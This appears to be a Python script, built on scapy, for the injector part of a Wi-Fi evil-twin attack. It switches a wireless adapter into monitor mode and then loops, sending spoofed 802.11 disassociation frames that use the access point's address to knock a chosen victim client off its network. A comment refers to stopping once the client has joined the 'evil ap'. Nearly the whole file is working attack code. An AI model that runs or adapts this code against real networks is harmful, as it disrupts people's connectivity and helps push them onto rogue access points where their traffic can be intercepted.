# =====================================================================
#                    INJECTOR SETUP
# =====================================================================   
"""
1. set the adapter to monitor mode
2. sending disas packets
"""
from scapy.all import sniff, Dot11, Dot11Beacon, Dot11Elt, Dot11Disas, RadioTap,Dot11Deauth, sendp
import time
import subprocess
import sys

def set_injector_adapter(interface_name, channel):
    print(f"[*] Setting {interface_name} to act as Injector...")
    try:
        subprocess.run(["sudo", "ip", "link", "set", interface_name, "down"], check=True)
        subprocess.run(["sudo", "iw", interface_name, "set", "type", "monitor"], check=True)
        subprocess.run(["sudo", "ip", "link", "set", interface_name, "up"], check=True)
        
        subprocess.run(["sudo", "iw", "dev", interface_name, "set", "channel", str(channel)], check=True)
        
    except subprocess.CalledProcessError as e:
        cmd_list = getattr(e, 'cmd', [])
        if "channel" in cmd_list:
            print(f"[!] Channrel error while setting {interface_name} as injector")
            sys.exit(1)
        else:
            print(f"[!] Changing {interface_name} to monitor mode failed with the error: {e}")
            sys.exit(1)

def send_disas_packets(interface_name, victim, ap, stop_injection):
    victim_addr = victim['bssid']
    bssid = ap['bssid']
    dot11_layer = Dot11(addr1=victim_addr, addr2=bssid, addr3=bssid, FCfield=2)
    disas_layer = Dot11Disas(reason=7)
    #deauth_layer = Dot11Deauth(reason=7)
    dis_packet = RadioTap() / dot11_layer / disas_layer
    #deauth_packet = RadioTap() / dot11_layer / deauth_layer
    
    print("[*] Started sending disassociation and deauthentication packets in the background ")
    while not stop_injection.is_set():
        try:
            sendp(dis_packet, iface=interface_name, count=10,inter=0.1, verbose=False)
            #sendp(deauth_packet, iface=interface_name, count=10,inter=0.1, verbose=False)
        # add option for injection thread to end when client already connected to evil ap

        except Exception as e:
            print("[!] Failed to sent Disas/Deauth packets due to {e}")
        if stop_injection.wait(0.2):
            break    
    print("[*] Injection thread cleanly stopped")
